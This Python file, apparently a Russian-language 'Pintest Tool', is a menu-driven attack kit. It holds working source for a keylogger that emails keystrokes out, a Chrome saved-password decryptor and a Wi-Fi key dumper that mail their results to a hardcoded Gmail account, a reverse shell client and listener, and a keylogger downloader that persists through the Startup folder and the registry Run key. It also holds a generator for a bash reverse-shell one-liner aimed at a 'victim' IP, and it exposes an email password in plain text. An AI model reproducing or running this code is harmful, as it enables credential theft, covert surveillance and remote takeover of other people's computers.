from ast import And
import os
import json
import base64
import sqlite3
from tkinter import TRUE
import win32crypt
from datetime import timezone, datetime, timedelta
from Crypto.Cipher import AES
import shutil
import re
import socket
import sys
import keyboard
from threading import Timer
import subprocess
import configparser
from collections import namedtuple
import smtplib
import os
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from art import *
import urllib.request
import shutil
from os import path
from pathlib import Path
import winreg
import time
from console_progressbar import ProgressBar
import vidstream


FileName = 116444736000000000
NanoSeconds = 10000000

SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
EMAIL_ADDRESS = "pintesttool@gmail.com"
EMAIL_PASSWORD = "rceabvcomnzjazjl"

def keyloger_win():
    class Keylogger:
        def __init__(self, interval, report_method="email"):
            # we gonna pass SEND_REPORT_EVERY to interval
            self.interval = interval
            self.report_method = report_method
            # this is the string variable that contains the log of all 
            # the keystrokes within `self.interval`
            self.log = ""
            # record start & end datetimes
            self.start_dt = datetime.now()
            self.end_dt = datetime.now()

        def callback(self, event):
            """
            This callback is invoked whenever a keyboard event is occured
            (i.e when a key is released in this example)
            """
            name = event.name
            if len(name) > 1:
                # not a character, special key (e.g ctrl, alt, etc.)
                # uppercase with []
                if name == "space":
                    # " " instead of "space"
                    name = " "
                elif name == "enter":
                    # add a new line whenever an ENTER is pressed
                    name = "[ENTER]\n"
                elif name == "decimal":
                    name = "."
                else:
                    # replace spaces with underscores
                    name = name.replace(" ", "_")
                    name = f"[{name.upper()}]"
            # finally, add the key name to our global `self.log` variable
            self.log += name
        
        def update_filename(self):
            # construct the filename to be identified by start & end datetimes
            start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
            end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
            self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

        def report_to_file(self):
            """This method creates a log file in the current directory that contains
            the current keylogs in the `self.log` variable"""
            # open the file in write mode (create it)
            with open(f"{self.filename}.txt", "w") as f:
                # write the keylogs to the file
                print(self.log, file=f)
            print(f"[+] Saved {self.filename}.txt")

        def prepare_mail(self, message):
            """Utility function to construct a MIMEMultipart from a text
            It creates an HTML version as well as text version
            to be sent as an email"""
            msg = MIMEMultipart("alternative")
            msg["From"] = EMAIL_ADDRESS
            msg["To"] = EMAIL_ADDRESS
            msg["Subject"] = "Keylogger logs"
            # simple paragraph, feel free to edit
            html = f"<p>{message}</p>"
            text_part = MIMEText(message, "plain")
            html_part = MIMEText(html, "html")
            msg.attach(text_part)
            msg.attach(html_part)
            # after making the mail, convert back as string message
            return msg.as_string()

        def sendmail(self, email, password, message, verbose=1):
            # manages a connection to an SMTP server
            # in our case it's for Microsoft365, Outlook, Hotmail, and live.com
            server = smtplib.SMTP("smtp.gmail.com", 587)
            # connect to the SMTP server as TLS mode ( for security )
            server.starttls()
            # login to the email account
            server.login(email, password)
            # send the actual message after preparation
            server.sendmail(email, email, self.prepare_mail(message))
            # terminates the session
            server.quit()
            if verbose:
                print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")

        def report(self):
            """
            This function gets called every `self.interval`
            It basically sends keylogs and resets `self.log` variable
            """
            if self.log:
                # if there is something in log, report it
                self.end_dt = datetime.now()
                # update `self.filename`
                self.update_filename()
                if self.report_method == "email":
                    self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
                elif self.report_method == "file":
                    self.report_to_file()
                    # if you don't want to print in the console, comment below line
                    print(f"[{self.filename}] - {self.log}")
                self.start_dt = datetime.now()
            self.log = ""
            timer = Timer(interval=self.interval, function=self.report)
            # set the thread as daemon (dies when main thread die)
            timer.daemon = True
            # start the timer
            timer.start()

        def start(self):
            # record the start datetime
            self.start_dt = datetime.now()
            # start the keylogger
            keyboard.on_release(callback=self.callback)
            # start reporting the keylogs
            self.report()
            # make a simple message
            #print(f"{datetime.now()} - Started keylogger")
            # block the current thread, wait until CTRL+C is pressed
            keyboard.wait()

        
    if __name__ == "__main__":
        # if you want a keylogger to send to your email
        keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
        # if you want a keylogger to record keylogs to a local file 
        # (and then send it using your favorite method)
        #keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
        keylogger.start()

def download_keylog():
    
    destination = 'downkey.pyw'
    url = "https://drive.google.com/u/1/uc?id=1_uchGo8XKpuunu2J4fIAwiSlZ_V1iG8K&export=download&confirm=t&uuid=4d356f7d-0ffc-4a86-b0c8-183207e7aba4"
    urllib.request.urlretrieve(url, destination)
    
    source_path = "downkey.pyw"
    if path.exists(source_path):
        try:
            destination_path = "C:/Users/artem/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
            shutil.move(source_path, destination_path)
        except:
            print("Произошла ошибка, возможно кейлогер уже есть")
    else:
        print ("Файл не существует.")
        
    if path.exists(source_path):
        try:
            destination_path = "C:/Users/artem/AppData/Local"
            shutil.move(source_path, destination_path)
        except:
            print("Произошла ошибка, возможно кейлогер уже есть")
    else:
        print ("Файл не существует.")
    
    access_registry = winreg.ConnectRegistry(None,winreg.HKEY_CURRENT_USER)
    key = winreg.OpenKey(access_registry, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", access=winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(key, "loger", None, winreg.REG_SZ, '"C:\\Users\\artem\\AppData\\Local\\downkey.pyw"')
    key.Close()
    
def listen_revers_shell_win():
    HOST = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0'
    PORT = int(sys.argv[2] if len(sys.argv) > 2 else 5555)

    s = socket.socket()
    s.connect((HOST, PORT))
    msg = s.recv(1024).decode()
    print('[*] server:', msg)

    while True:
        cmd = s.recv(1024).decode()
        print(f'[*] receive {cmd}')
        if cmd.lower() in ['q', 'quit', 'x', 'exit']:
            break

        try:
            result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
        except Exception as e:
            result = str(e).encode()

        if len(result) == 0:
            result = 'OK'.encode()

        s.send(result)

    s.close()

def create_revers_shell_win():

    HOST = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0'
    PORT = int(sys.argv[2] if len(sys.argv) > 2 else 5555)

    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))

    s.listen(1)

    while True:
        print(f'[*] listening as {HOST}:{PORT}')

        client = s.accept()
        print(f'[*] client connected {client[1]}')

        client[0].send('welcome to axju'.encode())
        while True:
            cmd = input('>>> ')
            client[0].send(cmd.encode())

            if cmd.lower() in ['q', 'quit', 'x', 'exit']:
                break

            result = client[0].recv(1024).decode()
            print(result)

        client[0].close()

        cmd = input('Wait for new client Y/n ') or 'y'
        if cmd.lower() in ['n', 'no']:
            break

    s.close()

def get_wifi_password_win():
    
    def get_windows_saved_ssids():
        #Возвращает список сохраненных SSID на машине Windows с помощью команды netsh
        #получить все сохраненные профили на ПК
        output = subprocess.check_output("netsh wlan show profiles").decode()
        ssids = []
        profiles = re.findall(r"Весь профиль пользователя\s(.*)", output)
        for profile in profiles:
            # для каждого SSID удалите пробелы и двоеточие
            ssid = profile.strip().strip(":").strip()
            # добавить в список
            ssids.append(ssid)
        return ssids
    
    
    def get_windows_saved_wifi_passwords(verbose=1):
        global profiles
        """Извлекает сохраненные пароли Wi‑Fi на машине Windows, эта функция извлекает данные с помощью netsh
        команды в Windows
        Аргументы:
            verbose (int, optional): whether to print saved profiles real-time. Defaults to 1.
        Результат:
            [list]: list of extracted profiles, a profile has the fields ["ssid", "ciphers", "key"]
        """
        ssids = get_windows_saved_ssids()
        Profile = namedtuple("Profile", ["ssid", "ciphers", "key"])
        profiles = []
        for ssid in ssids:
            ssid_details = subprocess.check_output(f"""netsh wlan show profile "{ssid}" key=clear""").decode()
            # получить шифры
            ciphers = re.findall(r"Cipher\s(.*)", ssid_details)
            # очистить пробелы и двоеточие
            ciphers = "/".join([c.strip().strip(":").strip() for c in ciphers])
            # получить пароль Wi‑Fi
            key = re.findall(r"Key Content\s(.*)", ssid_details)
            # очистить пробелы и двоеточие
            try:
                key = key[0].strip().strip(":").strip()
            except IndexError:
                key = "None"
            profile = Profile(ssid=ssid, ciphers=ciphers, key=key)
            if verbose >= 1:
                print_windows_profile(profile)
            profiles.append(profile)
        return profiles
    
    
    def print_windows_profile(profile):
        #Печать одного профиля в Windows
        print(f"{profile.ssid:25}{profile.ciphers:15}{profile.key:50}")
        
        
    def print_windows_profiles_2(verbose):
        my_file = open("wifipass.txt", "w+")
        my_file.write("SSID                     CIPHER(S)      KEY")
        my_file.write("-"*50)
        
        #Печатает все извлеченные SSID вместе с ключом в Windows
        print("SSID                     CIPHER(S)      KEY")
        print("-"*50)
        get_windows_saved_wifi_passwords(verbose)
        my_file.write(profiles)
        my_file.close()
        
    def send_email():
        
        sender = "pintesttool@gmail.com"
        password = ("rceabvcomnzjazjl")

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        
        
        try:
            
            server.login(sender, password)
            msg = MIMEMultipart()
            msg["Subject"] = "wifipass"
            
            with open("wifipass.txt") as file:
                wifipass = MIMEText(file.read())
            
            wifipass.add_header('content-disposition', 'attachment', filename='wifipass.txt')
            msg.attach(wifipass)
            server.sendmail(sender, sender, msg.as_string())
        except Exception as _ex:
            return f"{_ex}\nCheck your login or password please!"  
        
    if __name__ == "__main__":
        print_windows_profiles_2(1)
        send_email()
    
def get_password():
    def chrome_date_and_time(chrome_data):
        # Chrome_data format is 'year-month-date 
        # hr:mins:seconds.milliseconds
        # This will return datetime.datetime Object
        return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
    
    
    def fetching_encryption_key():
        # Local_computer_directory_path will look 
        # like this below
        # C: => Users => <Your_Name> => AppData =>
        # Local => Google => Chrome => User Data =>
        # Local State
        local_computer_directory_path = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", 
        "User Data", "Local State")
        
        with open(local_computer_directory_path, "r", encoding="utf-8") as f:
            local_state_data = f.read()
            local_state_data = json.loads(local_state_data)
    
        # decoding the encryption key using base64
        encryption_key = base64.b64decode(
        local_state_data["os_crypt"]["encrypted_key"])
        
        # remove Windows Data Protection API (DPAPI) str
        encryption_key = encryption_key[5:]
        
        # return decrypted key
        return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
    
    
    def password_decryption(password, encryption_key):
        try:
            iv = password[3:15]
            password = password[15:]
            
            # generate cipher
            cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
            
            # decrypt password
            return cipher.decrypt(password)[:-16].decode()
        except:
            
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return "No Passwords"
    
    
    def main():
        key = fetching_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Profile 1", "Login Data")
        filename = "ChromePasswords.db"
        try:
            shutil.copyfile(db_path, filename)
        except:
            pass
        
        # connecting to the database
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        
        # 'logins' table has the data
        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
            "order by date_last_used")
        
        # iterate over all rows
        my_file = open("pass.txt", "w+")
        for row in cursor.fetchall():
            main_url = row[0]
            
            #my_file.write(main_url)
            
            login_page_url = row[1]
            
            #my_file.write(login_page_url)
            
            user_name = row[2]
            
            #my_file.write(user_name)
            
            decrypted_password = password_decryption(row[3], key)
            
            #my_file.write(decrypted_password)
            
            date_of_creation = row[4]
            
            forwrite_date_of_creation = str(date_of_creation)
            #my_file.write(forwrite_date_of_creation)
            
            last_usuage = row[5]
            
            forwrite_last_usuage = str(last_usuage)
            #my_file.write(forwrite_last_usuage)
            
            
            if user_name or decrypted_password:
                #print(f"Main URL: {main_url}")
                #print(f"Login URL: {login_page_url}")
                #print(f"User name: {user_name}")
                #print(f"Decrypted Password: {decrypted_password}")
                
                my_file.write(f"Main URL: {main_url}\n")
                my_file.write(f"Login URL: {login_page_url}\n")
                my_file.write(f"Main URL: {main_url}\n")
                my_file.write(f"User name: {user_name}\n")
                my_file.write(f"Decrypted Password: {decrypted_password}\n")
            
            else:
                continue
            
            if date_of_creation != 86400000000 and date_of_creation:
                #print(f"Creation date: {str(chrome_date_and_time(date_of_creation))}")
                my_file.write(f"Creation date: {str(chrome_date_and_time(date_of_creation))}\n")
            
            if last_usuage != 86400000000 and last_usuage:
                #print(f"Last Used: {str(chrome_date_and_time(last_usuage))}")
                my_file.write(f"Last Used: {str(chrome_date_and_time(last_usuage))}\n")
                
            #print("=" * 100)
            my_file.write("=" * 100)
            my_file.write("\n")
        my_file.close()
        cursor.close()
        db.close()
        
        
    def main2():
        key2 = fetching_encryption_key()
        db_path2 = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
        filename2 = "ChromePasswords.db"
        try:
            shutil.copyfile(db_path2, filename2)
        except:
            pass
        
        # connecting to the database
        db2 = sqlite3.connect(filename2)
        cursor2 = db2.cursor()
        
        # 'logins' table has the data
        cursor2.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
            "order by date_last_used")
        
        # iterate over all rows
        my_file2 = open("pass2.txt", "w+")
        for row in cursor2.fetchall():
            main_url2 = row[0]
            
            #my_file.write(main_url)
            
            login_page_url2 = row[1]
            
            #my_file.write(login_page_url)
            
            user_name2 = row[2]
            
            #my_file.write(user_name)
            
            decrypted_password2 = password_decryption(row[3], key2)
            
            #my_file.write(decrypted_password)
            
            date_of_creation2 = row[4]
            
            forwrite_date_of_creation = str(date_of_creation2)
            #my_file.write(forwrite_date_of_creation)
            
            last_usuage2 = row[5]
            
            forwrite_last_usuage = str(last_usuage2)
            #my_file.write(forwrite_last_usuage)
            
            
            if user_name2 or decrypted_password2:
                #print(f"Main URL: {main_url}")
                #print(f"Login URL: {login_page_url}")
                #print(f"User name: {user_name}")
                #print(f"Decrypted Password: {decrypted_password}")
                
                my_file2.write(f"Main URL: {main_url2}\n")
                my_file2.write(f"Login URL: {login_page_url2}\n")
                my_file2.write(f"Main URL: {main_url2}\n")
                my_file2.write(f"User name: {user_name2}\n")
                my_file2.write(f"Decrypted Password: {decrypted_password2}\n")
            
            else:
                continue
            
            if date_of_creation2 != 86400000000 and date_of_creation2:
                #print(f"Creation date: {str(chrome_date_and_time(date_of_creation))}")
                my_file2.write(f"Creation date: {str(chrome_date_and_time(date_of_creation2))}\n")
            
            if last_usuage2 != 86400000000 and last_usuage2:
                #print(f"Last Used: {str(chrome_date_and_time(last_usuage))}")
                my_file2.write(f"Last Used: {str(chrome_date_and_time(last_usuage2))}\n")
                
            #print("=" * 100)
            my_file2.write("=" * 100)
            my_file2.write("\n")
        my_file2.close()
        cursor2.close()
        db2.close()
        
    def send_email():
        
        sender = "pintesttool@gmail.com"
        password = ("rceabvcomnzjazjl")

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        
        
        try:
            
            server.login(sender, password)
            msg = MIMEMultipart()
            msg["Subject"] = "pass"
            
            with open("pass.txt") as file:
                paswd = MIMEText(file.read())
            with open("pass2.txt") as file2:
                paswd2 = MIMEText(file2.read())
            
            paswd.add_header('content-disposition', 'attachment', filename='pass.txt')
            paswd2.add_header('content-disposition', 'attachment', filename='pass2.txt')
            msg.attach(paswd)
            msg.attach(paswd2)
            server.sendmail(sender, sender, msg.as_string())
        except Exception as _ex:
            return f"{_ex}\nCheck your login or password please!"  
    
        
    if __name__ == "__main__":
        main()
        main2()
        send_email()

def check_security():
    test_path = 'C:/Users/artem/AppData/Local/Google/Chrome/User Data/'
    list_pass = []
    startup_virs = False
    startup_error = False
    
    print("checking startup")
    
    for file in os.listdir('C:/Users/artem/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'):
        if file.endswith(".pyw"):
            print("Что-то странное")
            startup_virs = True
            print(os.path.join(file))
            
        elif file.endswith(".exe"):
            print("Что-то странное")
            startup_virs = True
            print(os.path.join(file))
        else:
            print("=============================")
            print(os.path.join(file))
            print('Пусто')
            print("=============================")
            
            
    if startup_virs == True:
        print("Мы нашли подозрительные программы в автозарузке")
        print("Нажмите сочетание клавишь win + r и напишите 'shell:startup'")
        print("Удалите все файлы, которые вы видите впервые")
        print("=============================")
    else:
        print("all good)")
        print("=============================")
    
    print(" ")
    print("=============================")
    print("checking regedit_startup")
    print("=============================")
    access_registry = winreg.ConnectRegistry(None,winreg.HKEY_CURRENT_USER)
    access_key = winreg.OpenKey(access_registry,r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")

    for n in range(20):
        try:
            x = winreg.EnumValue(access_key,n)
            print(x[0])
        except:
            break
    print(" ")
    print("Если вы видите незнакомое название программы, то запустите заново программу и выбирите функцию '07'")
        
    print(" ")
    print("=============================")
    print("checking pass_browser")
    print("=============================")
    
    for i in range(len(os.listdir(test_path))):
        
        if os.path.exists('C:/Users/artem/AppData/Local/Google/Chrome/User Data/' + (os.listdir(test_path)[i]) + '/Login Data') == True and (os.listdir(test_path)[i]) !=  'Guest Profile' and (os.listdir(test_path)[i]) !=  'System Profile':
            list_pass.append((os.listdir(test_path)[i]))
            #print("Мы нашли ваши пароли в профиле" + ' ' + (os.listdir(test_path)[i]))
            #print("Лучше измените название профиля в Google chrome")
        else:
            pass
    print("Мы нашли ваши пароли в профиле" + " " + (", ".join(map(str, list_pass))) + '.')
    print("Лучше измените название профиля в Google chrome")
    
def delete_regedit():
    access_registry = winreg.ConnectRegistry(None,winreg.HKEY_CURRENT_USER)
    access_key = winreg.OpenKey(access_registry,r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", access=winreg.KEY_ALL_ACCESS)

    for n in range(20):
        try:
            x = winreg.EnumValue(access_key,n)
            print(x[0])
        except:
            break
    print("")
    name = str(input("введите название подозрительной прораммы для удаления\n"))
    print("")
    accept = str(input("вы уверены?\n"))
    if accept == "yes" or accept == "да" or accept == "Yes" or accept == "Да":
        try:
            winreg.DeleteValue(access_key, name)
            pb = ProgressBar(total=100,prefix='deleting', suffix='', decimals=0, length=50, fill='█', zfill='-')
            for i in range(101):
                pb.print_progress_bar(i)
                time.sleep(0.05)
            print("Готово!")

        except:
            print("Такой программы нет")
    else:
        print("Отмена")

def create_backdoor_macOS():
    ip = str(input("Введите ip жертвы\n"))
    my_file = open("backdoor.pyw", "w+")
    my_file.write('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'+ip+'",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);')
    print("Готово!")


tprint("Pintest Tool")
print("Выберете ОС")
print("00 Windows")
print("01 MacOS")

work = False
main_menu = True
Windows_menu = False
IOS_menu = False
Linux_menu = False
Android_menu = False


while work == False:
    command = (input("Введите команду: "))
    
#####################  Выбор ОС  ############################
    if command == "00" and main_menu == True:
        Windows_menu = True
        main_menu = False
        try:
            os.system('CLS') 
        except:
            os.system('clear') 

        print("00 Украсть пароли браузера")
        print("01 Украсть пароли wifi")
        print("02 Создать reverse shell")
        print("03 Прослушать reverse shell")
        print("04 keyloger")
        print("05 download keyloger")
        print("06 проверка безопасности")
        print("07 delete regedit_startup")
        print("99 Главное меню")
        
        
    elif command == "01" and main_menu == True:
        main_menu = False
        IOS_menu = True
        try:
            os.system('CLS') 
        except:
            os.system('clear') 
        print("00 backdoor")
        print("99 Главное меню")
        
        
    elif command == "02" and main_menu == True:
        main_menu = False
        Linux_menu = True
        try:
            os.system('CLS') 
        except:
            os.system('clear') 
        print("99 Главное меню")
        
        
    elif command == "03" and main_menu == True:
        main_menu = False
        Android_menu = True
        try:
            os.system('CLS') 
        except:
            os.system('clear') 
        print("99 Главное меню")
##########################################################



#####################  Выбор функций для windows  ############################
    elif command == "00" and Windows_menu == True:
        work = True
        try:
            os.system('CLS') 
        except:
            os.system('clear') 
        get_password()
    
    elif command == "01" and Windows_menu == True:
        work = True
        try:
            os.system('CLS') 
        except:
            os.system('clear') 
        get_wifi_password_win()
    
    elif command == "02" and Windows_menu == True:
        work = True
        try:
            os.system('CLS') 
        except:
            os.system('clear') 
        create_revers_shell_win()
        
    elif command == "03" and Windows_menu == True:
        work = True
        try:
            os.system('CLS') 
        except:
            os.system('clear') 
        listen_revers_shell_win()
    
    elif command == "04" and Windows_menu == True:
        work = True
        try:
            os.system('CLS') 
        except:
            os.system('clear') 
        keyloger_win()
        
    elif command == "05" and Windows_menu == True:
        work = True
        try:
            os.system('CLS') 
        except:
            os.system('clear') 
        download_keylog()
    
    elif command == "06" and Windows_menu == True:
        work = True
        try:
            os.system('CLS') 
        except:
            os.system('clear') 
        check_security()
        
    elif command == "07" and Windows_menu == True:
        work = True
        try:
            os.system('CLS') 
        except:
            os.system('clear') 
        delete_regedit()
        
    elif command == "99" and (Windows_menu == True or Linux_menu == True or IOS_menu == True or Android_menu == True):
        Windows_menu = False
        Linux_menu = False
        IOS_menu = False
        Android_menu = False
        main_menu = True
        try:
            os.system('CLS') 
        except:
            os.system('clear') 
        tprint("Pintest Tool")
        print("Выберете ОС")
        print("00 Windows")
        print("01 MacOS")
        
###############################################################################


#####################  Выбор функций для MacOS  ############################
    elif command == "00" and IOS_menu == True:
        work = True
        try:
            os.system('CLS') 
        except:
            os.system('clear') 
        create_backdoor_macOS()
        
    elif command == "99" and IOS_menu == True:
        Windows_menu = False
        Linux_menu = False
        IOS_menu = False
        Android_menu = False
        main_menu = True
        try:
            os.system('CLS') 
        except:
            os.system('clear') 
        tprint("Pintest Tool")
        print("Выберете ОС")
        print("00 Windows")
        print("01 MacOS")
        
        
###############################################################################





#https://github.com/FZGbzuw412/Python-RAT#
